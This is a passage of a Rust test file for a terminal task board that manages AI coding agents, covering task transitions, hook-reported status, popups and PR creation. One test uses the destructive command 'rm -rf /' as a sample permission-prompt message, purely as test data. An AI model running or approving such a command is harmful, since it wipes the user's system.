    mock_agent_ops
        .expect_co_author_string()
        .return_const("Test <test@test.com>".to_string());
    let mock_agent_arc: Arc<dyn AgentOperations> = Arc::new(mock_agent_ops);
    mock_registry
        .expect_get()
        .returning(move |_| Arc::clone(&mock_agent_arc));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let mut task = make_test_task("t1", "Implement feature", TaskStatus::Running);
    task.pr_number = Some(42);
    task.pr_url = Some("https://github.com/org/repo/pull/42".to_string());
    task.session_name = Some("test-project:task-t1".to_string());
    task.worktree_path = Some("/tmp/wt".to_string());
    task.branch_name = Some("task/t1".to_string());

    let result = app.transition_to_review(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true);
    assert!(app.state.pr_status_popup.is_some());
    assert!(app.state.pr_creation_rx.is_some());
}

// --- transition_to_done ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_done_merged_pr_shows_popup() {
    // Task has a merged PR → shows done_confirm_popup with Merged state
    let mock_tmux = MockTmuxOperations::new();

    let mut mock_git_provider = MockGitProviderOperations::new();
    mock_git_provider
        .expect_get_pr_state()
        .returning(|_, _| Ok(PullRequestState::Merged));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(mock_git_provider),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Review);
    task.pr_number = Some(5);

    let result = app.transition_to_done(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true);
    assert!(app.state.done_confirm_popup.is_some());
    let popup = app.state.done_confirm_popup.as_ref().unwrap();
    assert!(matches!(popup.pr_state, DoneConfirmPrState::Merged));
    assert_eq!(popup.pr_number, 5);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_done_uncommitted_changes_shows_popup() {
    // No PR, but uncommitted changes → shows done_confirm_popup with UncommittedChanges
    let mock_tmux = MockTmuxOperations::new();

    let mut mock_git = MockGitOperations::new();
    mock_git.expect_has_changes().returning(|_| true);

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Review);
    task.pr_number = None;
    task.worktree_path = Some("/tmp/wt".to_string());

    let result = app.transition_to_done(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true);
    assert!(app.state.done_confirm_popup.is_some());
    let popup = app.state.done_confirm_popup.as_ref().unwrap();
    assert!(matches!(
        popup.pr_state,
        DoneConfirmPrState::UncommittedChanges
    ));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_done_clean_clears_session_and_worktree() {
    // No PR, no uncommitted changes → spawns cleanup, clears session/worktree, returns Ok(false)
    let mut mock_tmux = MockTmuxOperations::new();
    // cleanup_task_resources may call kill_window
    mock_tmux.expect_kill_window().returning(|_| Ok(()));

    let mut mock_git = MockGitOperations::new();
    mock_git.expect_has_changes().returning(|_| false);
    // cleanup_task_resources may call remove_worktree
    mock_git.expect_remove_worktree().returning(|_, _| Ok(()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Review);
    task.pr_number = None;
    task.session_name = Some("test-project:task-t1".to_string());
    task.worktree_path = Some("/tmp/wt".to_string());

    let result = app.transition_to_done(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), false); // Ok(false) → continue with db update
                                        // Task fields cleared synchronously before background thread
    assert!(task.session_name.is_none());
    assert!(task.worktree_path.is_none());
    // No popup shown
    assert!(app.state.done_confirm_popup.is_none());
}

// =============================================================================
// Tests for apply_session_refresh
// =============================================================================

/// Build a minimal SessionTaskStatus for tests.
#[cfg(feature = "test-mocks")]
fn make_session_task_status(
    task_id: &str,
    status: TaskStatus,
    phase_status: PhaseStatus,
    was_ready: bool,
) -> SessionTaskStatus {
    SessionTaskStatus {
        task_id: task_id.to_string(),
        phase_status,
        content_hash: None,
        hook_status: None,
        awaiting_trust: None,
        status,
        worktree_path: None,
        session_name: None,
        agent: "claude".to_string(),
        was_ready,
    }
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_working_inserts_cache() {
    // Working status → stored in phase_status_cache as Working
    let mut app = make_test_app();
    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Planning,
            PhaseStatus::Working,
            false,
        )],
    };
    app.apply_session_refresh(result);
    let (phase, _) = app.state.phase_status_cache["t1"];
    assert_eq!(phase, PhaseStatus::Working);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_ready_inserts_cache() {
    // Ready status → stored as Ready, clears idle hash
    let mut app = make_test_app();
    // Pre-populate a content hash so we can verify it gets removed
    app.state
        .pane_content_hashes
        .insert("t1".to_string(), (42, std::time::Instant::now()));

    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Running,
            PhaseStatus::Ready,
            false,
        )],
    };
    app.apply_session_refresh(result);
    let (phase, _) = app.state.phase_status_cache["t1"];
    assert_eq!(phase, PhaseStatus::Ready);
    // Hash should be cleared on Ready
    assert!(!app.state.pane_content_hashes.contains_key("t1"));
}

// ── hook-reported status ─────────────────────────────────────────────────────

#[cfg(feature = "test-mocks")]
fn hook(state: crate::agent::hook_status::HookState) -> crate::agent::hook_status::AgentHookStatus {
    crate::agent::hook_status::AgentHookStatus {
        ts: 0,
        state,
        session_id: None,
        transcript_path: None,
        message: None,
        tool: None,
        agent: "claude".to_string(),
    }
}

#[cfg(feature = "test-mocks")]
fn refresh_with_hook(
    app: &mut App,
    hook_status: Option<crate::agent::hook_status::AgentHookStatus>,
    content_hash: Option<u64>,
) -> PhaseStatus {
    let result = SessionRefreshResult {
        statuses: vec![SessionTaskStatus {
            task_id: "t1".to_string(),
            phase_status: PhaseStatus::Working,
            content_hash,
            hook_status,
            awaiting_trust: None,
            status: TaskStatus::Planning,
            worktree_path: None,
            session_name: None,
            agent: "claude".to_string(),
            was_ready: false,
        }],
    };
    app.apply_session_refresh(result);
    app.state.phase_status_cache["t1"].0
}

/// An agent's own report beats the pane-hash heuristic: thinking silently for
/// longer than 15s is Working, not Idle.
#[test]
#[cfg(feature = "test-mocks")]
fn test_hook_working_beats_a_stale_pane_hash() {
    use crate::agent::hook_status::HookState;
    let mut app = make_test_app();
    let old = std::time::Instant::now() - std::time::Duration::from_secs(20);
    app.state
        .pane_content_hashes
        .insert("t1".to_string(), (99, old));

    let phase = refresh_with_hook(&mut app, Some(hook(HookState::Working)), Some(99));

    assert_eq!(
        phase,
        PhaseStatus::Working,
        "a hook saying Working must override 20s of unchanged pane output"
    );
    assert!(
        !app.state.pane_content_hashes.contains_key("t1"),
        "pane history should be dropped once the agent reports for itself"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_hook_blocked_maps_to_blocked_and_records_reason() {
    use crate::agent::hook_status::HookState;
    let mut app = make_test_app();
    let mut h = hook(HookState::Blocked);
    h.message = Some("Allow Bash(rm -rf /)?".to_string());

    assert_eq!(
        refresh_with_hook(&mut app, Some(h), None),
        PhaseStatus::Blocked
    );
    assert_eq!(
        app.state.blocked_reasons.get("t1").map(String::as_str),
        Some("Allow Bash(rm -rf /)?")
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_blocked_reason_is_cleared_when_the_agent_resumes() {
    use crate::agent::hook_status::HookState;
    let mut app = make_test_app();
    let mut h = hook(HookState::Blocked);
    h.message = Some("Allow Bash?".to_string());
    refresh_with_hook(&mut app, Some(h), None);

    refresh_with_hook(&mut app, Some(hook(HookState::Working)), None);

    assert!(
        !app.state.blocked_reasons.contains_key("t1"),
        "a stale reason must not linger on the card after the agent resumes"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_hook_waiting_maps_to_idle() {
    use crate::agent::hook_status::HookState;
    let mut app = make_test_app();
    // "turn ended, no artifact yet" is what Idle has always meant, so the
    // merge-conflict and stuck-task consumers keep working unchanged.
    assert_eq!(
        refresh_with_hook(&mut app, Some(hook(HookState::Waiting)), None),
        PhaseStatus::Idle
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_hook_ended_maps_to_exited() {
    use crate::agent::hook_status::HookState;
    let mut app = make_test_app();
    assert_eq!(
        refresh_with_hook(&mut app, Some(hook(HookState::Ended)), None),
        PhaseStatus::Exited
    );
}

/// The fallback contract: with no hook report, behaviour is exactly as before.
#[test]
#[cfg(feature = "test-mocks")]
fn test_no_hook_status_keeps_the_pane_heuristic() {
    let mut app = make_test_app();
    let old = std::time::Instant::now() - std::time::Duration::from_secs(20);
    app.state
        .pane_content_hashes
        .insert("t1".to_string(), (99, old));

    assert_eq!(
        refresh_with_hook(&mut app, None, Some(99)),
        PhaseStatus::Idle
    );
}

/// Artifact detection is untouched by this plan — Ready still wins.
#[test]
#[cfg(feature = "test-mocks")]
fn test_ready_artifact_outranks_a_working_hook() {
    use crate::agent::hook_status::HookState;
    let mut app = make_test_app();
    let result = SessionRefreshResult {
        statuses: vec![SessionTaskStatus {
            task_id: "t1".to_string(),
            phase_status: PhaseStatus::Ready,
            content_hash: None,
            hook_status: Some(hook(HookState::Working)),
            awaiting_trust: None,
            status: TaskStatus::Planning,
            worktree_path: None,
            session_name: None,
            agent: "claude".to_string(),
            was_ready: false,
        }],
    };
    app.apply_session_refresh(result);
    assert_eq!(app.state.phase_status_cache["t1"].0, PhaseStatus::Ready);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_working_becomes_idle_after_15s() {
    // Working with same content hash stable for ≥15s → promoted to Idle
    let mut app = make_test_app();
    let old_instant = std::time::Instant::now() - std::time::Duration::from_secs(20);
    app.state
        .pane_content_hashes
        .insert("t1".to_string(), (99, old_instant));

    let result = SessionRefreshResult {
        statuses: vec![SessionTaskStatus {
            task_id: "t1".to_string(),
            phase_status: PhaseStatus::Working,
            content_hash: Some(99), // same hash → stable
            hook_status: None,
            awaiting_trust: None,
            status: TaskStatus::Planning,
            worktree_path: None,
            session_name: None,
            agent: "claude".to_string(),
            was_ready: false,
        }],
    };
    app.apply_session_refresh(result);
    let (phase, _) = app.state.phase_status_cache["t1"];
    assert_eq!(phase, PhaseStatus::Idle);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_working_stays_working_hash_changed() {
    // Working with changed content hash → still Working (timer resets)
    let mut app = make_test_app();
    let old_instant = std::time::Instant::now() - std::time::Duration::from_secs(20);
    app.state
        .pane_content_hashes
        .insert("t1".to_string(), (99, old_instant));

    let result = SessionRefreshResult {
        statuses: vec![SessionTaskStatus {
            task_id: "t1".to_string(),
            phase_status: PhaseStatus::Working,
            content_hash: Some(100), // different hash → timer resets
            hook_status: None,
            awaiting_trust: None,
            status: TaskStatus::Planning,
            worktree_path: None,
            session_name: None,
            agent: "claude".to_string(),
            was_ready: false,
        }],
    };
    app.apply_session_refresh(result);
    let (phase, _) = app.state.phase_status_cache["t1"];
    assert_eq!(phase, PhaseStatus::Working); // not promoted to Idle
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_newly_ready_notifies_orchestrator() {
    // newly_ready (was_ready=false, now Ready) with orchestrator active → writes DB notification
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    // Add a task so the notification message can include its title
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My feature", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Planning;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    // Simulate orchestrator active
    app.state.orchestrator_session = Some("orch-session".to_string());

    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Planning,
            PhaseStatus::Ready,
            false,
        )],
    };
    app.apply_session_refresh(result);

    // Notification should have been written to the DB
    let db = app.state.db.as_ref().unwrap();
    let notifs = db.peek_notifications().unwrap();
    assert!(
        !notifs.is_empty(),
        "should have created an orchestrator notification"
    );
    assert!(notifs[0].message.contains("My feature"));
    assert!(notifs[0].message.contains("planning"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_already_ready_no_notification() {
    // was_ready=true → not newly ready → no orchestrator notification
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    app.state.orchestrator_session = Some("orch-session".to_string());

    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Planning,
            PhaseStatus::Ready,
            true,
        )],
    };
    app.apply_session_refresh(result);

    let db = app.state.db.as_ref().unwrap();
    let notifs = db.peek_notifications().unwrap();
    assert!(notifs.is_empty(), "should not notify when was_ready=true");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_apply_session_refresh_multiple_tasks() {
    // Multiple tasks in a single result batch — each gets its own cache entry
    let mut app = make_test_app();
    let result = SessionRefreshResult {
        statuses: vec![
            make_session_task_status("t1", TaskStatus::Planning, PhaseStatus::Working, false),
            make_session_task_status("t2", TaskStatus::Running, PhaseStatus::Ready, false),
            make_session_task_status("t3", TaskStatus::Review, PhaseStatus::Idle, false),
        ],
    };
    app.apply_session_refresh(result);
    assert_eq!(app.state.phase_status_cache["t1"].0, PhaseStatus::Working);
    assert_eq!(app.state.phase_status_cache["t2"].0, PhaseStatus::Ready);
    assert_eq!(app.state.phase_status_cache["t3"].0, PhaseStatus::Idle);
}

// =============================================================================
// Tests for popup confirmation handlers
// =============================================================================

// --- handle_done_confirm_key ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_done_confirm_y_force_moves_to_done() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_kill_window().returning(|_| Ok(()));
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_remove_worktree().returning(|_, _| Ok(()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    // Create a task in the DB so force_move_to_done can find it
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("Ship it", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Review;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.done_confirm_popup = Some(DoneConfirmPopup {
        task_id: "t1".to_string(),
        pr_number: 0,
        pr_state: DoneConfirmPrState::UncommittedChanges,
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('y'), crossterm::event::KeyModifiers::NONE);
    app.handle_done_confirm_key(key).unwrap();

    assert!(app.state.done_confirm_popup.is_none());
    // Task should be Done in DB
    let updated = app
        .state
        .db
        .as_ref()
        .unwrap()
        .get_task("t1")
        .unwrap()
        .unwrap();
    assert_eq!(updated.status, TaskStatus::Done);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_done_confirm_n_cancels() {
    let mut app = make_test_app();
    app.state.done_confirm_popup = Some(DoneConfirmPopup {
        task_id: "t1".to_string(),
        pr_number: 0,
        pr_state: DoneConfirmPrState::UncommittedChanges,
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('n'), crossterm::event::KeyModifiers::NONE);
    app.handle_done_confirm_key(key).unwrap();

    assert!(app.state.done_confirm_popup.is_none()); // popup dismissed
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_done_confirm_esc_cancels() {
    let mut app = make_test_app();
    app.state.done_confirm_popup = Some(DoneConfirmPopup {
        task_id: "t1".to_string(),
        pr_number: 5,
        pr_state: DoneConfirmPrState::Open,
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Esc, crossterm::event::KeyModifiers::NONE);
    app.handle_done_confirm_key(key).unwrap();

    assert!(app.state.done_confirm_popup.is_none());
}

// --- handle_move_confirm_key ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_move_confirm_y_clears_popup_and_moves() {
    // y → clears popup, sets skip_move_confirm, calls move_task_right
    // We put a Backlog task on the board so move_task_right has something to do
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My task", "claude", "test-project");
    task.id = "t1".to_string();
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.move_confirm_popup = Some(MoveConfirmPopup {
        task_id: "t1".to_string(),
        from_status: TaskStatus::Backlog,
        to_status: TaskStatus::Planning,
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('y'), crossterm::event::KeyModifiers::NONE);
    app.handle_move_confirm_key(key).unwrap();

    assert!(app.state.move_confirm_popup.is_none());
    // skip_move_confirm should be reset to false after the call
    assert!(!app.state.skip_move_confirm);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_move_confirm_n_only_clears_popup() {
    let mut app = make_test_app();
    app.state.move_confirm_popup = Some(MoveConfirmPopup {
        task_id: "t1".to_string(),
        from_status: TaskStatus::Planning,
        to_status: TaskStatus::Running,
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('n'), crossterm::event::KeyModifiers::NONE);
    app.handle_move_confirm_key(key).unwrap();

    assert!(app.state.move_confirm_popup.is_none());
    assert!(!app.state.skip_move_confirm);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_move_confirm_esc_clears_popup() {
    let mut app = make_test_app();
    app.state.move_confirm_popup = Some(MoveConfirmPopup {
        task_id: "t1".to_string(),
        from_status: TaskStatus::Running,
        to_status: TaskStatus::Review,
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Esc, crossterm::event::KeyModifiers::NONE);
    app.handle_move_confirm_key(key).unwrap();

    assert!(app.state.move_confirm_popup.is_none());
}

// --- handle_review_confirm_key ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_review_confirm_y_starts_pr_generation() {
    // y → calls move_running_to_review_with_pr → opens pr_confirm_popup (generating=true)
    let mut mock_git = MockGitOperations::new();
    mock_git
        .expect_diff_stat_from_main()
        .returning(|_| String::new());

    let mut mock_registry = MockAgentRegistry::new();
    let mut mock_agent_ops = MockAgentOperations::new();
    mock_agent_ops
        .expect_generate_text()
        .returning(|_, _| Ok(String::new()));
    let ops_arc: Arc<dyn AgentOperations> = Arc::new(mock_agent_ops);
    mock_registry
        .expect_get()
        .returning(move |_| Arc::clone(&ops_arc));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(MockTmuxOperations::new()),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    // Create a Running task in the DB
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My feature", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.review_confirm_popup = Some(ReviewConfirmPopup {
        task_id: "t1".to_string(),
        task_title: "My feature".to_string(),
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('y'), crossterm::event::KeyModifiers::NONE);
    app.handle_review_confirm_key(key).unwrap();

    assert!(app.state.review_confirm_popup.is_none());
    // pr_confirm_popup should appear with generating=true
    assert!(app.state.pr_confirm_popup.is_some());
    assert!(app.state.pr_confirm_popup.as_ref().unwrap().generating);
    // Background PR generation thread spawned
    assert!(app.state.pr_generation_rx.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_review_confirm_n_moves_without_pr() {
    // n → moves to Review without creating PR, no pr_confirm_popup
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(MockTmuxOperations::new()),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My feature", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.review_confirm_popup = Some(ReviewConfirmPopup {
        task_id: "t1".to_string(),
        task_title: "My feature".to_string(),
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('n'), crossterm::event::KeyModifiers::NONE);
    app.handle_review_confirm_key(key).unwrap();

    assert!(app.state.review_confirm_popup.is_none());
    assert!(app.state.pr_confirm_popup.is_none()); // no PR popup
                                                   // Task should be in Review now
    let updated = app
        .state
        .db
        .as_ref()
        .unwrap()
        .get_task("t1")
        .unwrap()
        .unwrap();
    assert_eq!(updated.status, TaskStatus::Review);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_review_confirm_esc_cancels() {
    let mut app = make_test_app();
    app.state.review_confirm_popup = Some(ReviewConfirmPopup {
        task_id: "t1".to_string(),
        task_title: "Some task".to_string(),
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Esc, crossterm::event::KeyModifiers::NONE);
    app.handle_review_confirm_key(key).unwrap();

    assert!(app.state.review_confirm_popup.is_none());
    assert!(app.state.pr_confirm_popup.is_none());
}

// --- handle_pr_confirm_key ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_tab_switches_field() {
    let mut app = make_test_app();
    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "Title".to_string(),
        pr_body: "Body".to_string(),
        editing_title: true,
        generating: false,
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Tab, crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key).unwrap();

    let popup = app.state.pr_confirm_popup.as_ref().unwrap();
    assert!(!popup.editing_title, "Tab should switch to body editing");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_char_appends_to_active_field() {
    let mut app = make_test_app();
    // editing_title=true → chars go to title
    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "Ti".to_string(),
        pr_body: String::new(),
        editing_title: true,
        generating: false,
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Char('X'), crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key).unwrap();
    assert_eq!(app.state.pr_confirm_popup.as_ref().unwrap().pr_title, "TiX");

    // Switch to body
    let tab = crossterm::event::KeyEvent::new(KeyCode::Tab, crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(tab).unwrap();

    let key2 =
        crossterm::event::KeyEvent::new(KeyCode::Char('Z'), crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key2).unwrap();
    assert_eq!(app.state.pr_confirm_popup.as_ref().unwrap().pr_body, "Z");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_backspace_removes_char() {
    let mut app = make_test_app();
    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "ABC".to_string(),
        pr_body: String::new(),
        editing_title: true,
        generating: false,
    });

    let key =
        crossterm::event::KeyEvent::new(KeyCode::Backspace, crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key).unwrap();
    assert_eq!(app.state.pr_confirm_popup.as_ref().unwrap().pr_title, "AB");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_enter_in_title_moves_to_body() {
    let mut app = make_test_app();
    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "Title".to_string(),
        pr_body: String::new(),
        editing_title: true,
        generating: false,
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Enter, crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key).unwrap();
    assert!(!app.state.pr_confirm_popup.as_ref().unwrap().editing_title);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_enter_in_body_adds_newline() {
    let mut app = make_test_app();
    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "Title".to_string(),
        pr_body: "Line1".to_string(),
        editing_title: false,
        generating: false,
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Enter, crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key).unwrap();
    assert_eq!(
        app.state.pr_confirm_popup.as_ref().unwrap().pr_body,
        "Line1\n"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_esc_closes_popup() {
    let mut app = make_test_app();
    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "T".to_string(),
        pr_body: String::new(),
        editing_title: true,
        generating: false,
    });

    let key = crossterm::event::KeyEvent::new(KeyCode::Esc, crossterm::event::KeyModifiers::NONE);
    app.handle_pr_confirm_key(key).unwrap();
    assert!(app.state.pr_confirm_popup.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_pr_confirm_ctrl_s_submits_pr() {
    // Ctrl+s when not generating → closes popup, spawns PR creation thread
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_add_all().returning(|_| Ok(()));
    mock_git.expect_has_changes().returning(|_| false);
    mock_git.expect_push().returning(|_, _, _| Ok(()));

    let mut mock_git_provider = MockGitProviderOperations::new();
    mock_git_provider
        .expect_create_pr()
        .returning(|_, _, _, _, _| Ok((1, "https://github.com/pr/1".to_string())));

    let mut mock_registry = MockAgentRegistry::new();
    let mut mock_agent_ops = MockAgentOperations::new();
    mock_agent_ops
        .expect_co_author_string()
        .return_const("Test <t@t.com>".to_string());
    let ops_arc: Arc<dyn AgentOperations> = Arc::new(mock_agent_ops);
    mock_registry
        .expect_get()
        .returning(move |_| Arc::clone(&ops_arc));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(MockTmuxOperations::new()),
        Arc::new(mock_git),
        Arc::new(mock_git_provider),
        Arc::new(mock_registry),
    )
    .unwrap();

    // Create task in DB
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("Feature", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    task.branch_name = Some("feature/t1".to_string());
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.pr_confirm_popup = Some(PrConfirmPopup {
        task_id: "t1".to_string(),
        pr_title: "Add feature".to_string(),
        pr_body: "Details".to_string(),
        editing_title: false,
        generating: false,
    });

    let key = crossterm::event::KeyEvent::new(
        KeyCode::Char('s'),
        crossterm::event::KeyModifiers::CONTROL,
    );
    app.handle_pr_confirm_key(key).unwrap();

    // Popup dismissed, pr_creation_rx set
    assert!(app.state.pr_confirm_popup.is_none());
    assert!(app.state.pr_status_popup.is_some());
    assert!(app.state.pr_creation_rx.is_some());
}

// =============================================================================
// Tests for process_transition_requests / execute_transition_request
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_process_transition_requests_empty_is_noop() {
    let mut app = make_test_app();
    // No pending requests → returns Ok, no panic
    let result = app.process_transition_requests();
    assert!(result.is_ok());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_process_transition_requests_skips_other_instance_claims() {
    let mut app = make_test_app();
    let db = app.state.db.as_ref().unwrap();

    let req = crate::db::TransitionRequest::new("missing-task", "move_forward");
    db.create_transition_request(&req).unwrap();

    assert!(db
        .claim_transition_request(&req.id, "other-instance")
        .unwrap());

    app.process_transition_requests().unwrap();

    let fresh = app
        .state
        .db
        .as_ref()
        .unwrap()
        .get_transition_request(&req.id)
        .unwrap()
        .unwrap();
    assert!(
        fresh.processed_at.is_none(),
        "other-instance claim must keep this instance from touching the request"
    );
    assert!(fresh.error.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_unknown_action_errors() {
    let mut app = make_test_app();
    let db = app.state.db.as_ref().unwrap();

    let mut task = Task::new("My task", "claude", "test-project");
    task.id = "t1".to_string();
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "fly_to_moon");
    let result = app.execute_transition_request(&req);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("Unknown action"));
}

#[test]
